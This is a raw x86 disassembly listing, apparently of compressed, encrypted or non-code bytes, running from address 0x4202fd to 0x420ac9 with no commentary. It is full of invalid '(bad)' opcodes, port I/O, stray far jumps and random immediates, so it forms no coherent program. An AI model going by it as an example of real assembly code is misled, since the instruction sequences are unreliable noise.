  4202fd:	jae    0x42035c
  4202ff:	xchg   DWORD PTR [ebx+ebx*8+0x4d],edi
  420303:	add    eax,DWORD PTR [edi+0x5e7e335f]
  420309:	lods   al,BYTE PTR ds:[esi]
  42030a:	fsub   DWORD PTR [edi-0x656b8e87]
  420310:	sub    ecx,eax
  420312:	add    bl,cl
  420314:	shl    DWORD PTR [esi+0x3a],cl
  420317:	fmul   QWORD PTR [eax+ebp*2]
  42031a:	push   ebp
  42031b:	or     eax,0x737d9b11
  420320:	cld    
  420321:	test   BYTE PTR [eax-0x6f],dh
  420324:	or     DWORD PTR [esi],edi
  420326:	shl    DWORD PTR [ebp+0x5d5e3dfa],cl
  42032c:	ss dec edx
  42032e:	push   ecx
  42032f:	mov    esi,0x13c1f60
  420334:	call   0x1d45:0xd767628b
  42033b:	cmp    eax,0xf016b5c4
  420340:	mov    esp,0xd504fb4d
  420345:	je     0x42031e
  420347:	jmp    0x6f40e190
  42034c:	aam    0x8e
  42034e:	jl     0x42038a
  420350:	xchg   ecx,eax
  420351:	dec    edi
  420352:	jg     0x420329
  420354:	xor    al,dh
  420356:	dec    ebp
  420357:	mov    ecx,0xdb134039
  42035c:	push   edx
  42035d:	sub    cl,BYTE PTR [ebx+0x50]
  420360:	mov    esi,0x6f4fa982
  420365:	mov    edi,0xe41f9718
  42036a:	outs   dx,BYTE PTR ds:[esi]
  42036b:	lods   eax,DWORD PTR ds:[esi]
  42036c:	in     eax,dx
  42036d:	cdq    
  42036e:	dec    ebp
  42036f:	push   edi
  420370:	jmp    0x4203bc
  420372:	xor    al,0xcf
  420374:	outs   dx,DWORD PTR ds:[esi]
  420375:	das    
  420376:	rcr    BYTE PTR [eax-0x48dedb28],0x70
  42037d:	mov    esp,0xf51c82c5
  420382:	fdiv   QWORD PTR [esi]
  420384:	or     ecx,DWORD PTR [eax-0x3a]
  420387:	rcr    eax,cl
  420389:	sbb    eax,0x67eb582d
  42038e:	jecxz  0x4203e2
  420390:	jb     0x42035e
  420392:	inc    ecx
  420393:	ds xchg esp,eax
  420395:	push   esp
  420396:	pop    ss
  420397:	jns    0x4203fd
  420399:	jmp    0x944d557a
  42039e:	dec    edi
  42039f:	iret   
  4203a0:	ins    BYTE PTR es:[edi],dx
  4203a1:	pop    edi
  4203a2:	(bad)  
  4203a3:	clc    
  4203a4:	cmc    
  4203a5:	inc    edx
  4203a6:	ret    
  4203a7:	sahf   
  4203a8:	cld    
  4203a9:	mov    ah,0xaa
  4203ab:	push   eax
  4203ac:	and    al,0xbf
  4203ae:	sub    al,0x7f
  4203b0:	xor    BYTE PTR [esi],ch
  4203b2:	call   0x1d901ad8
  4203b7:	mov    al,ds:0xe97b1d7b
  4203bc:	pop    edx
  4203bd:	hlt    
  4203be:	mov    ecx,0x682b78c
  4203c3:	pop    eax
  4203c4:	in     al,dx
  4203c5:	pop    ds
  4203c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203c7:	sub    al,0xdc
  4203c9:	nop
  4203ca:	pop    ecx
  4203cb:	mov    bh,0x69
  4203cd:	adc    ah,cl
  4203cf:	mov    al,0x57
  4203d1:	addps  xmm7,XMMWORD PTR [eax]
  4203d4:	out    dx,eax
  4203d5:	cmc    
  4203d6:	mov    ds:0x141a446b,eax
  4203db:	repz test DWORD PTR [eax+0x4d],ebp
  4203df:	retf   0xe0c3
  4203e2:	sub    eax,0x8cd66bf2
  4203e7:	and    eax,0x3f56a10a
  4203ec:	dec    edi
  4203ed:	cdq    
  4203ee:	push   eax
  4203ef:	add    eax,0x573dabb
  4203f4:	mov    bh,0xd7
  4203f6:	pop    ss
  4203f7:	dec    esp
  4203f8:	xchg   ebp,eax
  4203f9:	cdq    
  4203fa:	or     ah,BYTE PTR [eax-0xe48faae]
  420400:	xchg   DWORD PTR [esi+0x12],ecx
  420403:	test   eax,0x94bd2475
  420408:	xor    al,0x22
  42040a:	push   cs
  42040b:	add    BYTE PTR [ebp+0x79],al
  42040e:	stos   BYTE PTR es:[edi],al
  42040f:	sub    bh,dl
  420411:	inc    esi
  420412:	retf   0x78a7
  420415:	sbb    al,0xbe
  420417:	pusha  
  420418:	xchg   esi,eax
  420419:	jbe    0x420489
  42041b:	push   0x91fc25d3
  420420:	std    
  420421:	sti    
  420422:	(bad)  
  420424:	sar    DWORD PTR [eax+ebp*2],0x9
  420428:	stos   DWORD PTR es:[edi],eax
  420429:	mov    dl,0xd7
  42042b:	push   edx
  42042c:	push   ds
  42042d:	jne    0x420424
  42042f:	add    DWORD PTR ds:0x2fe0c3f,edi
  420435:	out    dx,eax
  420436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420437:	push   cs
  420438:	push   ebp
  420439:	pusha  
  42043a:	ss jge 0x42044a
  42043d:	and    eax,DWORD PTR [ebx+0x3f37ef0e]
  420443:	mov    al,ds:0x6d38bfe5
  420448:	inc    edx
  420449:	mov    ecx,0x2977b88c
  42044e:	faddp  st(5),st
  420450:	pushf  
  420451:	out    dx,eax
  420452:	xor    bh,BYTE PTR [ecx-0x6ba70c6f]
  420458:	push   0xffffffc5
  42045a:	addr16 (bad) 
  42045c:	jle    0x420422
  42045e:	lods   eax,DWORD PTR ds:[esi]
  42045f:	loope  0x42046b
  420461:	rcl    ebx,0xd
  420464:	push   ebp
  420465:	fmul   DWORD PTR [ecx]
  420467:	(bad)  [ebp-0x4e]
  42046a:	xor    al,BYTE PTR [esi+0x57a76a3f]
  420470:	cmp    edx,DWORD PTR [eax+0x543293c9]
  420476:	jae    0x420457
  420478:	adc    eax,0x17aa84d4
  42047d:	test   al,0x6d
  42047f:	sub    DWORD PTR [ebx],eax
  420481:	retf   
  420482:	in     al,dx
  420483:	stos   BYTE PTR es:[edi],al
  420484:	retf   0x63f9
  420487:	sub    eax,0xe626e9e3
  42048c:	push   cs
  42048d:	xchg   ebx,eax
  42048e:	mov    al,ds:0xef7b70e8
  420493:	jp     0x420447
  420495:	pop    edi
  420496:	retf   
  420497:	sar    DWORD PTR [ebx],cl
  420499:	mov    dl,0x1e
  42049b:	shr    BYTE PTR [ebp-0x1f],0xd7
  42049f:	das    
  4204a0:	jns    0x4204ac
  4204a2:	(bad)  
  4204a3:	xlat   BYTE PTR ds:[ebx]
  4204a4:	sahf   
  4204a5:	rcr    BYTE PTR [ebx],1
  4204a7:	mov    bl,BYTE PTR [esi+0x34]
  4204aa:	cmp    BYTE PTR [ebp-0x1d],dh
  4204ad:	(bad)  
  4204ae:	fisub  WORD PTR [edx+edx*1+0x2cb6c224]
  4204b5:	fsubr  DWORD PTR [ecx-0x699a10d9]
  4204bb:	or     al,0x97
  4204bd:	scas   al,BYTE PTR es:[edi]
  4204be:	sbb    dl,bl
  4204c0:	sbb    eax,0x48189fa7
  4204c5:	fcmovne st,st(6)
  4204c7:	daa    
  4204c8:	scas   al,BYTE PTR es:[edi]
  4204c9:	nop
  4204ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204cb:	repz mov dl,0xed
  4204ce:	dec    edi
  4204cf:	push   ebp
  4204d0:	inc    edx
  4204d1:	inc    edx
  4204d2:	adc    esi,DWORD PTR [edx+eiz*8]
  4204d5:	es mov edx,0xa59987bd
  4204db:	and    al,0x0
  4204dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204de:	sbb    eax,0x15b300ee
  4204e3:	out    dx,eax
  4204e4:	call   0x9f5e25d7
  4204e9:	adc    eax,DWORD PTR ds:0x9e16fb7
  4204ef:	test   eax,0x5166256f
  4204f4:	pminsw mm5,mm5
  4204f7:	dec    edx
  4204f8:	sub    ebp,DWORD PTR [ebx+0x41]
  4204fb:	sub    esi,edx
  4204fd:	cs retf 0x80dc
  420501:	int3   
  420502:	inc    esi
  420503:	mov    dl,0x5d
  420505:	out    dx,eax
  420506:	test   al,0x9d
  420508:	push   esp
  420509:	pop    esi
  42050a:	stos   BYTE PTR es:[edi],al
  42050b:	loope  0x420512
  42050d:	push   0x57183e40
  420512:	retf   0xffb0
  420515:	retf   0x313d
  420518:	fist   DWORD PTR [esi+0x6030d123]
  42051e:	inc    esi
  42051f:	inc    edx
  420520:	add    eax,0x6d76ed50
  420525:	in     al,0x72
  420527:	hlt    
  420528:	cli    
  420529:	inc    ebx
  42052a:	push   ecx
  42052b:	jnp    0x420576
  42052d:	or     edi,DWORD PTR [edi-0x66]
  420530:	mov    ah,0xf2
  420532:	rcl    BYTE PTR [ecx],0xe3
  420535:	mov    dl,BYTE PTR es:[ebp-0x4f]
  420539:	push   bp
  42053b:	fwait
  42053c:	das    
  42053d:	and    DWORD PTR [esi],esi
  42053f:	xchg   esp,eax
  420540:	push   esi
  420541:	xor    DWORD PTR [ebp+0x10],0x6d
  420545:	jbe    0x420546
  420547:	shl    BYTE PTR [edx-0x4],1
  42054a:	xchg   edi,eax
  42054b:	jge    0x420562
  42054d:	cmp    esi,DWORD PTR [esi+eax*8-0x2e]
  420551:	sub    ecx,edx
  420553:	mov    es,WORD PTR [ecx]
  420555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420556:	out    dx,al
  420557:	ds in  eax,0xd
  42055a:	sub    DWORD PTR [edi+0xed18b2c],ebp
  420560:	popf   
  420561:	in     al,0xa4
  420563:	mov    esi,fs
  420565:	inc    eax
  420566:	mov    eax,ds:0xe4c5e0c5
  42056b:	mov    ebp,0x33984036
  420570:	inc    eax
  420571:	add    BYTE PTR [edx],ah
  420573:	xchg   edi,eax
  420574:	pop    ebp
  420575:	ret    0x1455
  420578:	or     BYTE PTR [edx],bh
  42057a:	jp     0x4205ee
  42057c:	into   
  42057d:	xchg   DWORD PTR [ecx+eax*4+0x75c86d55],ebp
  420584:	add    eax,0x6d084c1f
  420589:	gs iret 
  42058b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42058c:	test   BYTE PTR ss:[edx-0x28],0x41
  420591:	loope  0x420574
  420593:	aad    0x5f
  420595:	cmp    bl,BYTE PTR [eax+0x634c60d3]
  42059b:	push   edi
  42059c:	inc    esp
  42059d:	xchg   edx,eax
  42059e:	add    bh,dl
  4205a0:	sbb    al,0x5c
  4205a2:	das    
  4205a3:	daa    
  4205a4:	adc    bl,dh
  4205a6:	dec    edx
  4205a7:	mov    ds,WORD PTR [esi]
  4205a9:	in     al,dx
  4205aa:	(bad)
  4205ad:	mov    esp,0x75cb5605
  4205b2:	aam    0x32
  4205b4:	jp     0x420625
  4205b6:	push   edx
  4205b7:	cmp    al,0x9a
  4205b9:	mov    bl,cl
  4205bb:	or     eax,0x664e1af6
  4205c0:	cwde   
  4205c1:	mov    al,ds:0x3d360c81
  4205c6:	outs   dx,BYTE PTR ds:[esi]
  4205c7:	jo     0x420644
  4205c9:	xor    DWORD PTR [edi+0x5212a27d],esp
  4205cf:	jnp    0x4205e7
  4205d1:	test   eax,0x937ae8e9
  4205d6:	push   ebx
  4205d7:	adc    eax,0x972a26de
  4205dc:	mul    BYTE PTR [esi]
  4205de:	inc    ebp
  4205df:	add    edx,DWORD PTR [ebp+0x3fb7069b]
  4205e5:	int    0x3a
  4205e7:	inc    esp
  4205e8:	and    eax,0x94971d1e
  4205ed:	ror    DWORD PTR [eax],1
  4205ef:	nop
  4205f0:	or     eax,0xe3aa8354
  4205f5:	pushf  
  4205f6:	xchg   edi,eax
  4205f7:	dec    ebx
  4205f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205f9:	sub    DWORD PTR [eax+edx*2+0x4ab90cbd],0x2290d2a1
  420604:	inc    ebx
  420605:	cmp    eax,0xcc716293
  42060a:	out    0x92,al
  42060c:	repz xchg edx,eax
  42060e:	pop    eax
  42060f:	pop    ss
  420610:	test   eax,0xe9da05ac
  420615:	mov    al,0xee
  420617:	lock mov bh,0x32
  42061a:	in     al,dx
  42061b:	inc    ecx
  42061c:	jp     0x42069b
  42061e:	cmp    al,0xfa
  420620:	cmp    eax,0x5214e992
  420625:	in     al,0x1a
  420627:	inc    esi
  420628:	mov    DWORD PTR [ebp+0x25],esp
  42062b:	cld    
  42062c:	add    ebx,eax
  42062e:	ret    0xec04
  420631:	inc    esi
  420632:	jecxz  0x4205f3
  420634:	xchg   esi,eax
  420635:	repnz fdivr QWORD PTR [ecx-0xa04d1f8]
  42063c:	rcl    bl,0x54
  42063f:	add    eax,0x6791c636
  420644:	pop    ebx
  420645:	enter  0xca0c,0xf7
  420649:	xor    dl,BYTE PTR [ebx+0x2e]
  42064c:	inc    esp
  42064d:	dec    ebp
  42064e:	push   edi
  42064f:	mov    ah,BYTE PTR [ebx-0x7c]
  420652:	inc    ecx
  420653:	aad    0x1
  420655:	out    0x87,al
  420657:	popa   
  420658:	jmp    0x420675
  42065a:	add    ebp,edi
  42065c:	(bad)  
  42065d:	(bad)  
  42065e:	push   esi
  42065f:	and    DWORD PTR [edx+0x71e3b627],0x68684ca4
  420669:	sbb    DWORD PTR ds:0x850f2a95,ebx
  42066f:	movzx  edx,cl
  420672:	pop    ss
  420673:	popa   
  420674:	push   esi
  420675:	pop    eax
  420676:	push   eax
  420677:	xor    BYTE PTR [ebx-0x75],bh
  42067a:	jno    0x420643
  42067c:	xchg   ecx,eax
  42067d:	add    DWORD PTR [esi-0x2f036237],eax
  420683:	mov    ch,0xa
  420685:	icebp  
  420686:	xor    eax,0x1b3d636f
  42068b:	add    BYTE PTR [edx+0x88ab37e],dl
  420691:	ror    ah,1
  420693:	mov    al,BYTE PTR [eax+0x35]
  420696:	xor    ebp,edx
  420698:	xchg   edx,eax
  420699:	jb     0x4206c2
  42069b:	jmp    ebp
  42069d:	jo     0x4206f0
  42069f:	xor    al,0x95
  4206a1:	arpl   WORD PTR [edi-0x52799246],di
  4206a7:	rcr    cl,1
  4206a9:	aaa    
  4206aa:	jmp    0x6037:0xcee3c6df
  4206b1:	in     eax,0xe3
  4206b3:	jmp    0xa469:0xc1ae5841
  4206ba:	mov    esp,ebx
  4206bc:	loop   0x42067b
  4206be:	mov    ah,0x59
  4206c0:	pop    eax
  4206c1:	mov    WORD PTR [edi+0x6b],cs
  4206c4:	leave  
  4206c5:	xor    al,0x59
  4206c7:	mov    BYTE PTR [ebx+0x21],ch
  4206ca:	or     al,dl
  4206cc:	inc    ecx
  4206cd:	addr16 xchg edx,eax
  4206cf:	mov    al,0x3b
  4206d1:	outs   dx,BYTE PTR ds:[esi]
  4206d2:	pop    esp
  4206d3:	cli    
  4206d4:	cld    
  4206d5:	pop    es
  4206d6:	mov    bl,0x47
  4206d8:	into   
  4206d9:	mov    edi,0x52899a03
  4206de:	das    
  4206df:	xor    BYTE PTR [eax+0x3],al
  4206e2:	out    0x29,al
  4206e4:	aam    0x5
  4206e6:	pop    ecx
  4206e7:	sub    al,0xcc
  4206e9:	sub    ebx,DWORD PTR [eax+0x33]
  4206ec:	xchg   edx,eax
  4206ed:	call   0x1e76:0xffbffd8
  4206f4:	popf   
  4206f5:	clc    
  4206f6:	daa    
  4206f7:	mov    ss,ebp
  4206f9:	xchg   edx,eax
  4206fa:	(bad)
  4206fd:	jb     0x4206a1
  4206ff:	pop    edx
  420700:	aaa    
  420701:	ins    DWORD PTR es:[edi],dx
  420702:	gs inc ecx
  420704:	in     al,dx
  420705:	pop    edx
  420706:	xor    al,0xfa
  420708:	loopne 0x4206a5
  42070a:	je     0x42069f
  42070c:	in     al,0x43
  42070e:	inc    ebx
  42070f:	lods   eax,DWORD PTR ds:[esi]
  420710:	xchg   ebx,esi
  420712:	adc    BYTE PTR [edx+0x18],cl
  420715:	jge    0x4206bf
  420717:	mov    cl,0xf0
  420719:	fmul   DWORD PTR [eax]
  42071b:	push   eax
  42071c:	dec    ebx
  42071d:	inc    ebx
  42071e:	lea    ebx,[ebx+0x286d8922]
  420724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420725:	and    ecx,DWORD PTR [eax+0x53]
  420728:	fmul   QWORD PTR ss:[ecx-0x5a]
  42072c:	add    BYTE PTR [esi+0x4f],0xbf
  420730:	loope  0x420764
  420732:	div    BYTE PTR [edx-0x28]
  420735:	cli    
  420736:	in     al,0x58
  420738:	xlat   BYTE PTR ds:[ebx]
  420739:	pusha  
  42073a:	enter  0x3ff7,0x10
  42073e:	fdiv   QWORD PTR [edi-0x3189f320]
  420744:	jmp    0x3af2f3d
  420749:	aaa    
  42074a:	retf   0x804
  42074d:	addr16 pusha 
  42074f:	call   0xcd63:0xcf76c1b
  420756:	outs   dx,DWORD PTR ds:[esi]
  420757:	retf   0x91ea
  42075a:	ds pop eax
  42075c:	jns    0x42072a
  42075e:	jmp    0xbf3d2d84
  420763:	repnz gs push esp
  420766:	int    0xc8
  420768:	push   ecx
  420769:	int3   
  42076a:	adc    bh,0x5d
  42076d:	jo     0x4207ec
  42076f:	push   ecx
  420770:	sbb    DWORD PTR [eax+0x1],eax
  420773:	and    DWORD PTR ds:0xed5279a9,0x59
  42077a:	sbb    bl,ah
  42077c:	loopne 0x4207ad
  42077e:	fisubr DWORD PTR [ebp+0x7b]
  420781:	aaa    
  420782:	dec    esp
  420783:	cld    
  420784:	(bad)  
  420785:	and    al,0x47
  420787:	enter  0x1c64,0xf8
  42078b:	fwait
  42078c:	ret    0xb995
  42078f:	jns    0x42071b
  420791:	push   ecx
  420792:	call   0x3413d8a1
  420797:	ficomp DWORD PTR [edi+0xe]
  42079a:	test   al,0xad
  42079c:	xor    eax,0x98f4cf44
  4207a1:	jbe    0x4207cb
  4207a3:	lods   eax,DWORD PTR ds:[esi]
  4207a4:	rol    BYTE PTR [ebp-0x140704f5],0x67
  4207ab:	jg     0x420765
  4207ad:	sub    dl,BYTE PTR [esi-0x19]
  4207b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207b1:	out    dx,eax
  4207b2:	mov    WORD PTR [ecx+0xa],?
  4207b5:	hlt    
  4207b6:	xchg   ebp,eax
  4207b7:	in     al,0x6b
  4207b9:	out    0xc,eax
  4207bb:	push   edi
  4207bc:	inc    ebx
  4207bd:	push   esi
  4207be:	mov    ds:0x8165f4b,eax
  4207c3:	mov    ch,0x68
  4207c5:	test   eax,0x65ccb817
  4207ca:	mov    ch,0xef
  4207cc:	test   eax,0x9f70762d
  4207d1:	(bad)  [esi+edx*2+0x743150b5]
  4207d8:	ja     0x420822
  4207da:	cwde   
  4207db:	sbb    BYTE PTR [ebx],ch
  4207dd:	outs   dx,BYTE PTR ds:[esi]
  4207de:	jl     0x4207ad
  4207e0:	out    dx,al
  4207e1:	mov    eax,0x513b4f55
  4207e6:	push   esi
  4207e7:	xor    al,0x6a
  4207e9:	sbb    DWORD PTR [edx+0x6e88d260],edx
  4207ef:	gs jp  0x42077c
  4207f2:	lea    ebx,[eax+0x754fcee3]
  4207f8:	lods   al,BYTE PTR ds:[esi]
  4207f9:	out    0x36,al
  4207fb:	xchg   edx,eax
  4207fc:	pop    ecx
  4207fd:	dec    ebx
  4207fe:	mov    cl,0x53
  420800:	aaa    
  420801:	daa    
  420802:	xchg   edx,eax
  420803:	fwait
  420804:	jl     0x4207cc
  420806:	xchg   edx,eax
  420807:	jecxz  0x420813
  420809:	pop    ecx
  42080a:	int3   
  42080b:	jmp    0xb489:0xdbcbd2b9
  420812:	xor    ebx,DWORD PTR [ebx]
  420814:	cmp    eax,ecx
  420816:	(bad)  
  420817:	fidivr WORD PTR [edi+0x32]
  42081a:	xbegin 0xa53a1a9d
  420820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420821:	xchg   esi,eax
  420822:	push   esp
  420823:	(bad)  
  420824:	movzx  edi,BYTE PTR [edi+edx*4-0x2d5c3747]
  42082c:	mov    esp,ecx
  42082e:	add    ecx,DWORD PTR [edx]
  420830:	loope  0x420878
  420832:	xchg   BYTE PTR [esp+edi*1+0x20],al
  420836:	jecxz  0x420858
  420838:	push   0xffffffa7
  42083a:	sub    ebx,DWORD PTR [ecx+0x14da8fde]
  420840:	sbb    ch,BYTE PTR [ebx-0x32681d68]
  420846:	jnp    0x420855
  420848:	out    0x3f,eax
  42084a:	or     BYTE PTR [edx+0xffeb24],bl
  420850:	and    al,0xd1
  420852:	out    dx,eax
  420853:	or     dh,BYTE PTR [ebx+0x56fd512e]
  420859:	outs   dx,DWORD PTR ds:[esi]
  42085a:	loopne 0x420867
  42085c:	leave  
  42085d:	or     DWORD PTR [ebx],ebx
  42085f:	xor    eax,0x2f38011f
  420864:	pop    ds
  420865:	or     BYTE PTR [edi],0xd2
  420868:	sbb    DWORD PTR fs:[esi-0x1a308c29],ebp
  42086f:	in     al,dx
  420870:	lods   al,BYTE PTR ds:[esi]
  420871:	xor    DWORD PTR [eax+0x4],0x35
  420875:	shl    DWORD PTR [ecx+0x655a30d4],0xc8
  42087c:	xlat   BYTE PTR ds:[ebx]
  42087d:	ins    DWORD PTR es:[edi],dx
  42087e:	fdivr  DWORD PTR [edi-0x70379437]
  420884:	xchg   edx,eax
  420885:	(bad)  
  420886:	jmp    0x4208d1
  420888:	cmp    eax,0x106d3228
  42088d:	xor    eax,DWORD PTR [edi+0x33981acf]
  420893:	xchg   esi,eax
  420894:	jo     0x420879
  420896:	and    DWORD PTR [edi+ebx*1],ebx
  420899:	xchg   ebp,eax
  42089a:	adc    ch,BYTE PTR [edi+edx*8+0x4278294d]
  4208a1:	mov    eax,0xf6b12423
  4208a6:	jle    0x42084e
  4208a8:	xchg   edx,eax
  4208a9:	jp     0x4208ef
  4208ab:	sbb    al,0xd9
  4208ad:	cmc    
  4208ae:	shl    BYTE PTR [eax-0x29],cl
  4208b1:	inc    edx
  4208b2:	sahf   
  4208b3:	out    0x50,eax
  4208b5:	(bad)  
  4208b6:	mov    BYTE PTR [eax+ebx*1],bh
  4208b9:	outs   dx,BYTE PTR ds:[esi]
  4208ba:	xchg   ebx,ebp
  4208bc:	pop    esi
  4208bd:	imul   edx,DWORD PTR [eax],0xb7a042b7
  4208c3:	lock sub bh,BYTE PTR [edi]
  4208c6:	pop    ecx
  4208c7:	leave  
  4208c8:	in     eax,dx
  4208c9:	inc    esi
  4208ca:	mov    edi,0x6b179cc2
  4208cf:	outs   dx,DWORD PTR ds:[esi]
  4208d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208d1:	xchg   esi,eax
  4208d2:	scas   al,BYTE PTR es:[edi]
  4208d3:	mov    ds:0xa9b38bb8,eax
  4208d8:	jmp    0x4208af
  4208da:	sbb    DWORD PTR [edi+0x72b36b11],0xffffff91
  4208e1:	dec    edi
  4208e2:	and    bl,ch
  4208e4:	sbb    al,0x76
  4208e6:	es jl  0x420878
  4208e9:	fidivr DWORD PTR [eax]
  4208eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208ec:	dec    ebx
  4208ed:	div    esp
  4208ef:	std    
  4208f0:	adc    edi,DWORD PTR [ecx+0x48a48750]
  4208f6:	push   0xffffffef
  4208f8:	call   0x917:0xbf830e62
  4208ff:	in     eax,dx
  420900:	jl     0x4208ab
  420902:	pop    ss
  420903:	js     0x420949
  420905:	or     eax,0x80ca3119
  42090a:	test   eax,0xe7cb2b1d
  42090f:	jmp    0xc19d:0xdf4abab1
  420916:	mov    BYTE PTR [ebx+edi*1-0x22b2b699],ah
  42091d:	push   esp
  42091e:	or     dh,BYTE PTR [ebp-0x4b]
  420921:	scas   al,BYTE PTR es:[edi]
  420922:	scas   eax,DWORD PTR es:[edi]
  420923:	add    ecx,DWORD PTR [ecx+eiz*8]
  420926:	loope  0x42095c
  420928:	or     ah,BYTE PTR [esi-0x38]
  42092b:	or     eax,0x9b537074
  420930:	shl    DWORD PTR [ebp+0x51],1
  420933:	mov    cl,BYTE PTR [edi]
  420935:	add    al,0xb3
  420937:	inc    esp
  420938:	sbb    BYTE PTR ds:0xb053c9c1,cl
  42093f:	ins    DWORD PTR es:[edi],dx
  420940:	mov    bh,0xba
  420942:	mov    al,cl
  420944:	pop    ecx
  420945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420946:	mov    dh,0x0
  420948:	outs   dx,BYTE PTR ds:[esi]
  420949:	shl    BYTE PTR ds:0x68ee4fe4,0x94
  420950:	ins    DWORD PTR es:[edi],dx
  420951:	(bad)  
  420953:	push   ds
  420954:	cwde   
  420955:	add    DWORD PTR [ebx-0x29ef7048],esp
  42095b:	pusha  
  42095c:	cmp    edx,ecx
  42095e:	addr16 imul esi,ebp,0x6c
  420962:	and    BYTE PTR [esi-0x5c],0x9c
  420966:	ins    DWORD PTR es:[edi],dx
  420967:	mov    ah,0x8
  420969:	or     al,0x92
  42096b:	fs adc eax,0x9274e198
  420971:	jecxz  0x42099f
  420973:	xchg   ebp,eax
  420974:	or     BYTE PTR [ecx+0x5f],0x31
  420978:	scas   eax,DWORD PTR es:[edi]
  420979:	test   eax,0x7cdc4141
  42097e:	dec    eax
  42097f:	(bad)  
  420980:	sti    
  420981:	adc    al,0x54
  420983:	fmul   QWORD PTR [edx]
  420985:	(bad)  
  420986:	mov    bh,0xee
  420988:	(bad)  
  420989:	dec    eax
  42098a:	inc    DWORD PTR [edi-0xc]
  42098d:	les    esp,FWORD PTR [esp+esi*4]
  420990:	fmul   st(0),st
  420992:	sbb    al,BYTE PTR [ebx+eax*1-0x7e24e970]
  420999:	ss stos BYTE PTR es:[edi],al
  42099b:	outs   dx,BYTE PTR ds:[esi]
  42099c:	adc    al,0xeb
  42099e:	fisub  DWORD PTR [ecx-0x5207bf0c]
  4209a4:	mov    eax,0x74828825
  4209a9:	pop    ebp
  4209aa:	mov    al,0xd6
  4209ac:	nop
  4209ad:	(bad)  
  4209ae:	sbb    ebp,DWORD PTR [esi-0x17281ff]
  4209b4:	in     eax,0x5f
  4209b6:	inc    edi
  4209b7:	xchg   edx,eax
  4209b8:	in     al,0xda
  4209ba:	inc    ebx
  4209bb:	out    0x5a,al
  4209bd:	xchg   esp,eax
  4209be:	stc    
  4209bf:	les    ebp,FWORD PTR [esi]
  4209c1:	stc    
  4209c2:	jmp    0xd26:0x7ceae099
  4209c9:	lods   eax,DWORD PTR ds:[esi]
  4209ca:	fisub  WORD PTR [esi-0x7af7e211]
  4209d0:	dec    ebx
  4209d1:	sbb    eax,0xa4ffd05a
  4209d6:	setno  BYTE PTR [edi+eax*4+0x6d]
  4209db:	jle    0x4209d4
  4209dd:	or     eax,0x85784243
  4209e2:	and    cl,BYTE PTR [ebx+ebx*1]
  4209e5:	add    ecx,DWORD PTR [ecx+0x5f67bbac]
  4209eb:	lea    edi,[eax-0x1bf3a207]
  4209f1:	dec    ecx
  4209f2:	xor    DWORD PTR [edi+0x5f],0x24
  4209f6:	in     al,dx
  4209f7:	pop    ebx
  4209f8:	push   ebx
  4209f9:	in     eax,0xe6
  4209fb:	sub    dl,BYTE PTR [ebx+0x5c99b481]
  420a01:	add    ebp,edx
  420a03:	xchg   DWORD PTR [eax],esi
  420a05:	pop    esp
  420a06:	xchg   ecx,eax
  420a07:	adc    BYTE PTR [eax+0x4835f4a1],dl
  420a0d:	mov    esp,0x35aef707
  420a12:	or     al,0xbe
  420a14:	pop    edx
  420a15:	mov    bl,0x3b
  420a17:	into   
  420a18:	vsubpd xmm0,xmm5,XMMWORD PTR [edx-0x6dee4e4b]
  420a20:	mov    eax,ds:0x984d1053
  420a25:	pop    esi
  420a26:	lods   al,BYTE PTR ds:[esi]
  420a27:	loope  0x420a5b
  420a29:	(bad)  [ecx+0x5b]
  420a2c:	bnd jge 0x420a0b
  420a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a30:	inc    esp
  420a31:	sbb    ch,BYTE PTR [edi]
  420a33:	std    
  420a34:	mov    ebp,0x2f3c2c36
  420a39:	mov    cl,0x6
  420a3b:	jp     0x420a11
  420a3d:	jge    0x420ab8
  420a3f:	push   dx
  420a41:	cld    
  420a42:	push   es
  420a43:	adc    DWORD PTR [ebp-0x6167cf53],ebx
  420a49:	test   BYTE PTR [edx-0x5e],ch
  420a4c:	ror    DWORD PTR [edx],1
  420a4e:	inc    ecx
  420a4f:	fdivrp st(2),st
  420a51:	cli    
  420a52:	sub    BYTE PTR [ebx],ah
  420a54:	nop
  420a55:	jg     0x420a54
  420a57:	adc    DWORD PTR [ebp+0x139a226d],0xc94ccec
  420a61:	xor    DWORD PTR [ecx],ebx
  420a63:	pushf  
  420a64:	sub    edx,0xd6dfc599
  420a6a:	data16 xor al,BYTE PTR [ebp-0x2086df6]
  420a71:	xor    BYTE PTR [eax-0x2],bl
  420a74:	adc    ebp,edi
  420a76:	mov    ds:0xca8fa2cb,eax
  420a7b:	cmp    ecx,DWORD PTR [ecx-0x7653c7ac]
  420a81:	push   ebp
  420a82:	push   0xffffffc4
  420a84:	mov    ebp,DWORD PTR [eax]
  420a86:	ret    
  420a87:	arpl   WORD PTR [esi-0x78f6dfab],bp
  420a8d:	pop    esi
  420a8e:	repz push cs
  420a90:	push   eax
  420a91:	add    eax,0x1f5d7550
  420a96:	mov    bh,bh
  420a98:	sub    ebp,ecx
  420a9a:	popa   
  420a9b:	mov    ch,0x97
  420a9d:	cld    
  420a9e:	lds    esp,FWORD PTR [eax]
  420aa0:	aad    0x7c
  420aa2:	repz mov al,0x83
  420aa5:	hlt    
  420aa6:	sbb    DWORD PTR [ebp+0x2932c5d2],ebx
  420aac:	aam    0xdf
  420aae:	shr    BYTE PTR [edx+0x4],0x8f
  420ab2:	cmp    BYTE PTR [esi+0x4ae642ce],bh
  420ab8:	mov    bl,0x6d
  420aba:	sti    
  420abb:	push   edx
  420abc:	inc    edx
  420abd:	dec    ecx
  420abe:	call   0x64e:0x43e81b04
  420ac5:	or     esp,ebx
  420ac7:	lock stos DWORD PTR es:[edi],eax
  420ac9:	scas   al,BYTE PTR es:[edi]
